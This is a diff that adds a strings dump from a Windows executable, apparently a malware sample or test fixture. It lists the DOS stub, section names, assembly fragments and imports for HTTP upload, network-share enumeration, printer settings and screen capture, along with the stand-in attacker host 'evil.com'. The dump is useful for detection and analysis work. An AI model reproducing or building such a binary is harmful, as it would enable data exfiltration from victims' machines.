@@ -1,0 +1,91 @@
+!This program cannot be run in DOS mode.
+zK6x>*X+>*X+>*X+E6T+;*X+h5K+
+*X+>*X+z*X+
+6V+#*X+
+R+7*X+\5K+'*X+>*Y+/(X+
+,^+?*X+Rich>*X+
+.rdata
+@.data
+D$,UWh
+T$,QPR
+u0h8?Q
+SUVWj
+d$(h(?Q
+d$Hh AQ
+d$0h AQ
+d$0h AQ
+d$Hh<@Q
+d$4h<@Q
+d$0h AQ
+d$<Rh,@Q
+d$0h AQ
+d$0h AQ
+d$8hxAQ
+d$8hlAQ
+SUVWj
+evil.com
+L$X_^]d
+d$0hhCQ
+d$,hhCQ
+T$Hj
+RP
+T$8QPR
+T$(RWWWh
+D$\h8EQ
+L$Hj\j
+d$0h,FQ
+d$8h,FQ
+L$4_^2
+d$0QhTAQ
+L$@_^][d
+t/9](u*
+D$|hTAQ
+d$0h(AQ
+9\$(t!
+d$0h4AQ
+9\$(t!
+d$0h4AQ
+9\$(t!
+\$,tOQ
+L$$_^]d
+L$8RPWQ
+D$$RPW
+L$,PQW
+L$0_^]
+D$0j#P
+L$ PQR
+BitBlt
+CreateCompatibleDC
+GetTextMetricsA
+GDI32.dll
+GetSaveFileNameA
+GetOpenFileNameA
+GetFileTitleA
+comdlg32.dll
+ClosePrinter
+SetPrinterA
+SetPrinterDataA
+AddPrinterA
+InternetCloseHandle
+InternetSetStatusCallback
+InternetSetFilePointer
+InternetWriteFile
+InternetReadFile
+InternetQueryDataAvailable
+InternetConnectA
+HttpOpenRequestA
+HttpSendRequestA
+InternetGetLastResponseInfoA
+WININET.dll
+WNetCloseEnum
+WNetEnumResourceA
+WNetOpenEnumA
+CoTaskMemFree
+StringFromCLSID
+IsWindowUnicode
+CharNextA
+DefDlgProcA
+ExcludeUpdateRgn
+ShowCaret
+HideCaret
+UnregisterClassA
